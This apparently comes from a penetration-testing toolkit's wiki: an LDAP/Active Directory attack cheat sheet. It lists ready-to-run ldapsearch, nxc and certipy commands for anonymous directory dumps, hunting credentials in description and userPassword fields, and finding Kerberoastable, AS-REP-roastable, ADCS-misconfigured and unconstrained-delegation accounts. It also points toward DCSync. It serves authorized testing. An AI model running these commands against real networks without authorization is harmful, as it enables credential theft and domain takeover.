---
service: ldap
title: LDAP / Active Directory
ports: 389, 636, 3268, 3269
aliases: ldaps, globalcatalog, gc
---

# LDAP — quick wins

**When you see it:** 389/tcp open and `ldapsearch -x -H ldap://H -s base namingcontexts`
returns a `DC=` naming context → anonymous bind works; every AD object in that base
is potentially readable without credentials.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target.

## Triage (read-only)
```sh
ldapsearch -x -H ldap://H -s base namingcontexts          # anon — get base DN
ldapsearch -x -H ldap://H -b 'DC=DOMAIN,DC=LOCAL' '(objectclass=*)' | head -60
nxc ldap H -u '' -p ''                                    # null bind check via nxc
nmap -Pn -p389 --script ldap-rootdse H                    # banner + domain info
```

## Quick wins

### Anonymous / null dump of users and computers
```sh
BASE='DC=DOMAIN,DC=LOCAL'
ldapsearch -x -H ldap://H -b "$BASE" '(objectClass=user)' \
    sAMAccountName description memberOf
ldapsearch -x -H ldap://H -b "$BASE" '(objectClass=computer)' \
    dNSHostName operatingSystem
```
*Why:* An anonymous bind can expose every user, group membership, description field (often
contains credentials), and the full computer inventory — no credentials required.

### Description-field credential hunt
```sh
ldapsearch -x -H ldap://H -D "U@DOMAIN" -w P -b 'DC=DOMAIN,DC=LOCAL' \
    '(objectClass=user)' sAMAccountName description \
  | grep -i 'description:' | grep -viE 'built-in|system|service account'
```
*Why:* Administrators frequently store temporary passwords in the `description` field of
user and service accounts — these are world-readable by any authenticated user.

### Find accounts with `userPassword` / `unixUserPassword`
```sh
ldapsearch -x -H ldap://H -D "U@DOMAIN" -w P -b 'DC=DOMAIN,DC=LOCAL' \
    '(|(userPassword=*)(unixUserPassword=*))' sAMAccountName userPassword
```
*Why:* POSIX-extension attributes can store cleartext or weakly-hashed passwords on
mixed Windows/Linux environments (ADAM, Samba, RFC 2307 schema extensions).

### ASREPRoast targets via LDAP
```sh
ldapsearch -x -H ldap://H -D "U@DOMAIN" -w P -b 'DC=DOMAIN,DC=LOCAL' \
    '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
    sAMAccountName
```
*Why:* Filter returns users with `DONT_REQUIRE_PREAUTH` set — these can be AS-REP
roasted without their password (see `wiki/kerberos.md`).

### Kerberoastable SPN accounts via LDAP
```sh
ldapsearch -x -H ldap://H -D "U@DOMAIN" -w P -b 'DC=DOMAIN,DC=LOCAL' \
    '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
```
*Why:* Any user account with an SPN can be Kerberoasted — request its TGS ticket and
crack offline. Cross-run with `GetUserSPNs.py` to get the actual hashes.

### nxc bulk enumeration + BloodHound collection
```sh
nxc ldap H -u U -p P -d DOMAIN --users --groups \
    --kerberoasting kerberoast.txt --asreproast asrep.txt
nxc ldap H -u U -p P -d DOMAIN --bloodhound --collection All \
    --dns-server DC
```
*Why:* Single-command output covers users, groups, Kerberoast/ASREPRoast hashes, and a
BloodHound ingestor run — fastest path to a full attack graph.

### AD CS template enumeration (ESC1–11)
```sh
certipy find -u U@DOMAIN -p P -dc-ip DC -text -json -output certipy
```
*Why:* Certipy audits every certificate template for misconfigurations (ESC1 =
enrollee-supplied SAN → arbitrary cert; ESC4 = write permissions). A single ESC1
template with default configuration is often a direct path to domain admin.
`standalones/windows/Get-ADCSMisconfig.ps1` provides a host-local variant.

### Unconstrained delegation accounts
```sh
ldapsearch -x -H ldap://H -D "U@DOMAIN" -w P -b 'DC=DOMAIN,DC=LOCAL' \
    '(userAccountControl:1.2.840.113556.1.4.803:=524288)' \
    sAMAccountName dNSHostName
```
*Why:* Accounts with unconstrained delegation cache any TGT that authenticates to them;
coerce a DC to authenticate (PetitPotam, DFSCoerce) and harvest the DC's TGT for DCSync.

## aranum helpers
- `aranumtoolkit/network/enum-ldap.sh` — runs ldapsearch, nxc ldap, bloodhound-python,
  certipy, and delegation queries automatically.
- `standalones/windows/Get-ADCSMisconfig.ps1` — host-local ADCS template auditor.

## Gotchas
- Port 3268 is the Global Catalog (GC) — it exposes data from all domains in the forest,
  not just the local domain; use `-b ''` (empty base) for cross-domain queries.
- LDAP signing (`ldapServerIntegrity = 2`) and channel binding block anonymous binds on
  Server 2019+ default policy; LDAPS (636) still works for authenticated queries.
- `namingcontexts` being returned does NOT guarantee full anonymous dump — many DCs allow
  root DSE but restrict subtree reads. Test with an actual `objectClass=user` query.
- Certipy `find` is noisy (many LDAP queries); run during a scheduled maintenance window
  or when detection tolerance allows.

## Sources
- HackTricks `pentesting-ldap`; The Hacker Recipes LDAP recon; PayloadsAllTheThings
  Active Directory — LDAP; Certipy by ly4k (ESC1–11); BloodHound CE docs.
